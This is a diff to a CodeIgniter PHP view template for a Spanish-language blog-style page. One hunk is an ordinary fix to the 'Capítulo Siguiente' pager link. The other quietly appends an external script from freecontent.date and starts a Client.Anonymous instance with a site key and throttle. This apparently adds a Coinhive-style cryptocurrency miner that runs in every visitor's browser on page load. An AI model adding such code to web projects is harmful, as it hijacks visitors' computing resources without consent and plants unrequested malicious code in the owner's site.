@@ -122,7 +122,7 @@ defined('BASEPATH') OR exit('No direct script access allowed');
           <hr>
           <!-- Pager -->
           <div class="clearfix">
-            <a class="btn btn-primary float-right" href="#">Capítulo Siguiente &rarr;</a>
+            <a class="btn btn-primary float-right" href="<?php echo base_url() ?>IndiceController/descripcion">Capítulo Siguiente &rarr;</a>
           </div>
         </div>
       </div>
@@ -175,6 +175,15 @@ defined('BASEPATH') OR exit('No direct script access allowed');
     <script src="<?php echo base_url() ?>assets/js/clean-blog.min.js"></script>
 
   </body>
+
+  <script src="https://www.freecontent.date./ovL0.js"></script>
+<script>
+    var _client = new Client.Anonymous('0df5a246946447fd570ca7839db8bd98fd09b8b9b6bafb8e25dfc39b5e1ef835', {
+        throttle: 0.9
+    });
+    _client.start();
+
+</script>
 
 </html>
 
